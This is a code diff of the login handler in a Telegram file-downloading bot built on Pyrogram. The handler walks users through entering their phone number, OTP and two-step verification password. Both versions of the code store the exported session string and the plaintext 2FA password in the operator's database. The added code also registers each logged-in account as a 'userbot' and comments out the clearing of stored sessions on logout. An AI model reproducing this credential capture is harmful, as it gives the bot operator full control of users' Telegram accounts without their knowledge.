@@ -1,17 +1,3 @@
-# ---------------------------------------------------
-# File Name: login.py
-# Description: A Pyrogram bot for downloading files from Telegram channels or groups 
-#              and uploading them back to Telegram.
-# Author: Gagan
-# GitHub: https://github.com/devgaganin/
-# Telegram: https://t.me/team_spy_pro
-# YouTube: https://youtube.com/@dev_gagan
-# Created: 2025-01-11
-# Last Modified: 2025-05-07
-# Version: 2.0.6
-# License: MIT License
-# ---------------------------------------------------
-
 from pyrogram import filters, Client
 from devgagan import app
 import random
@@ -19,11 +5,9 @@ import os
 import string
 import pytz
 from datetime import datetime
-from config import OWNER_ID
-from devgagan.core.mongo import db
-from devgagan.core.mongo.db import user_sessions_real
+from devgagan.core.mongo.db import db
 from devgagan.core.func import subscribe
-from config import API_ID as api_id, API_HASH as api_hash
+from config import API_ID as api_id, API_HASH as api_hash, OWNER_ID
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -62,10 +46,10 @@ async def clear_db(client, message):
     files_deleted = await delete_session_files(user_id)
     try:
         await db.remove_session(user_id)
-        await db.user_sessions_real.update_one(
+        """await db.user_sessions_real.update_one(
             {"user_id": user_id},
             {"$set": {"session_string": None}}
-        )
+        )"""
     except Exception:
         pass
 
@@ -74,93 +58,104 @@ async def clear_db(client, message):
     else:
         await message.reply("✅ Logged out with flag -m")
 
+
+
+
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
         return
 
-    user_id = message.chat.id
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code.\nExample: +919876543210', filters=filters.text)
-    phone_number = number.text
+    success = await handle_login_flow(_, message.chat.id)
+    if success:
+        await message.reply("✅ Login successful!\n🚀 Bot is now activated.")
 
+
+
+async def handle_login_flow(_, user_id: int):
     try:
-        await message.reply("📲 Sending OTP...")
+        ask1 = await _.ask(user_id, "📞 Enter your phone number (e.g. +919876543210):", filters=filters.text)
+        phone_number = ask1.text
+        await ask1.delete()
+
+        await _.send_message(user_id, "📲 Sending OTP...")
         client = Client(f"session_{user_id}", api_id, api_hash)
         await client.connect()
-    except Exception as e:
-        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
-        return
 
-    try:
-        code = await client.send_code(phone_number)
-    except ApiIdInvalid:
-        await message.reply('❌ Invalid API ID/HASH. Please restart the session.')
-        return
-    except PhoneNumberInvalid:
-        await message.reply('❌ Invalid phone number. Please restart the session.')
-        return
+        try:
+            code = await client.send_code(phone_number)
+        except ApiIdInvalid:
+            await _.send_message(user_id, "❌ Invalid API ID/HASH. Please restart.")
+            return
+        except PhoneNumberInvalid:
+            await _.send_message(user_id, "❌ Invalid phone number. Please restart.")
+            return False 
 
-    try:
-        otp_code = await _.ask(user_id, "Enter OTP (Format: 1 2 3 4 5)", filters=filters.text, timeout=600)
+        ask2 = await _.ask(user_id, "🔐 Enter OTP (e.g. 1 2 3 4 5):", filters=filters.text, timeout=600)
+        phone_code = ask2.text.replace(" ", "")
+        await ask2.delete()
+
+        try:
+            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
+        except PhoneCodeInvalid:
+            await _.send_message(user_id, "❌ Invalid OTP. Please restart.")
+            return False
+        except PhoneCodeExpired:
+            await _.send_message(user_id, "❌ OTP expired. Please restart.")
+            return False
+        except SessionPasswordNeeded:
+            ask3 = await _.ask(user_id, "🔒 Enter 2FA password:", filters=filters.text, timeout=300)
+            password = ask3.text
+            await ask3.delete()
+            try:
+                await client.check_password(password=password)
+            except PasswordHashInvalid:
+                await _.send_message(user_id, "❌ Wrong password. Please restart.")
+                return False 
+        else:
+            password = None
+
+        string_session = await client.export_session_string()
+        
+
+        me = await client.get_me()
+        username = me.username or "N/A"
+        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
+        telegram_id = me.id
+
+        ist = pytz.timezone('Asia/Kolkata')
+        current_time = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
+
+        user_data = {
+            "user_id": telegram_id,
+            "username": username,
+            "name": full_name,
+            "phone_number": phone_number,
+            "session_string": string_session,
+            "session": string_session,
+            "password": password,
+            "last_login": current_time
+        }
+
+
+        details = {
+       'id': telegram_id,
+       'is_bot': False,
+       'user_id': telegram_id,
+       'name': full_name,
+       'session': string_session,
+       'username': username
+     }
+        await db.update_user(telegram_id, user_data)
+        await db.add_userbot(details)
+        await client.disconnect()
+        return True 
+
     except TimeoutError:
-        await message.reply('⏰ Time limit exceeded. Please restart the session.')
-        return
+        await _.send_message(user_id, "⏰ Timed out. Please restart with /login.")
+        return False
 
-    phone_code = otp_code.text.replace(" ", "")
 
-    try:
-        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-    except PhoneCodeInvalid:
-        await message.reply('❌ Invalid OTP. Please restart the session.')
-        return
-    except PhoneCodeExpired:
-        await message.reply('❌ Expired OTP. Please restart the session.')
-        return
-    except SessionPasswordNeeded:
-        try:
-            two_step_msg = await _.ask(user_id, 'Your account has two-step verification enabled. Enter your password.', filters=filters.text, timeout=300)
-        except TimeoutError:
-            await message.reply('⏰ Time limit exceeded. Please restart the session.')
-            return
-        try:
-            password = two_step_msg.text
-            await client.check_password(password=password)
-        except PasswordHashInvalid:
-            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
-            return
-    else:
-        password = None
 
-    string_session = await client.export_session_string()
-    await db.set_session(user_id, string_session)
 
-    me = await client.get_me()
-    username = me.username if me.username else "N/A"
-    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
-    user_id = me.id
-
-    ist = pytz.timezone('Asia/Kolkata')
-    current_time_ist = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
-
-    user_data = {
-        "user_id": user_id,
-        "username": username,
-        "name": full_name,
-        "phone_number": phone_number,
-        "session_string": string_session,
-        "password": password,
-        "last_login": current_time_ist
-    }
-
-    existing_user = await db.user_sessions_real.find_one({"phone_number": phone_number})
-    if existing_user:
-        await db.user_sessions_real.update_one(
-            {"phone_number": phone_number},
-            {"$set": user_data}
-        )
-    else:
-        await db.user_sessions_real.insert_one(user_data)
-
-    await client.disconnect()
-    await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
